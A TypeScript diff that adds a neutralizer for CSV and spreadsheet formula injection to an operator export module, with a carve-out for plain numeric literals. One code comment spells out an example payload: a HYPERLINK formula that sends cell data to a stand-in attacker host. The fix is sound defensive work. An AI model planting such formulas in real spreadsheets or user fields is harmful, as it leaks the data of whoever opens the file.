@@ -27,15 +27,57 @@ export type ExportSection = {
 };
 
 /**
+ * Characters that make Excel / Google Sheets treat a cell as a FORMULA
+ * rather than text. RFC 4180 quoting does NOT stop this — `"=cmd"` is
+ * still evaluated on open.
+ */
+const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
+/**
+ * A plain signed decimal literal (`-12`, `+3.5`, `1e6`). These trip
+ * `CSV_FORMULA_PREFIX` on the leading `-`/`+` but are never formulas, and
+ * prefixing them would corrupt every negative money column in the export
+ * (`-1500.00` → `'-1500.00`, which Sheets reads as text). Excluded on
+ * purpose: a leading sign followed only by digits cannot invoke anything.
+ */
+const CSV_NUMERIC_LITERAL = /^[+-]?(?:\d+(?:\.\d*)?|\.\d+)(?:[eE][+-]?\d+)?$/;
+
+/**
+ * Neutralize CSV / spreadsheet formula injection.
+ *
+ * Player-controlled free text (usernames, affiliate codes, emails, country
+ * names) flows straight into operator exports. A username like
+ * `=HYPERLINK("https://evil.tld/?d="&A2,"click")` becomes a live
+ * exfiltration link the moment an operator opens the file. Prefixing with
+ * a single quote is the standard neutralizer: the cell renders as literal
+ * text and the leading quote is not shown by Excel / Sheets.
+ *
+ * Exported so the other CSV builders (`users-export.ts`,
+ * `all-users-csv.ts`) apply the SAME rule instead of drifting.
+ */
+export function neutralizeCsvFormula(str: string): string {
+  if (!CSV_FORMULA_PREFIX.test(str)) return str;
+  if (CSV_NUMERIC_LITERAL.test(str)) return str;
+  return `'${str}`;
+}
+
+/**
  * Escape a single CSV field per RFC 4180: wrap in double quotes when the
  * value contains a comma, double quote, CR or LF; double any internal
  * quotes. `null` / `undefined` render as an empty field. Numbers render
  * via String() so locale grouping never sneaks in (raw machine value —
  * the human-formatted version belongs in the UI, not the export).
+ *
+ * Formula neutralization runs FIRST (see {@link neutralizeCsvFormula}), so
+ * the quoting below wraps the already-safe value.
  */
 export function escapeCsvField(value: ExportCell): string {
   if (value === null || value === undefined) return "";
-  const str = typeof value === "number" ? String(value) : value;
+  // A `number` came from our own aggregates, never from user input, and
+  // String() can't produce a formula — skip the sanitizer so negative
+  // numbers stay numeric.
+  const raw = typeof value === "number" ? String(value) : value;
+  const str = typeof value === "number" ? raw : neutralizeCsvFormula(raw);
   if (/[",\r\n]/.test(str)) {
     return `"${str.replace(/"/g, '""')}"`;
   }
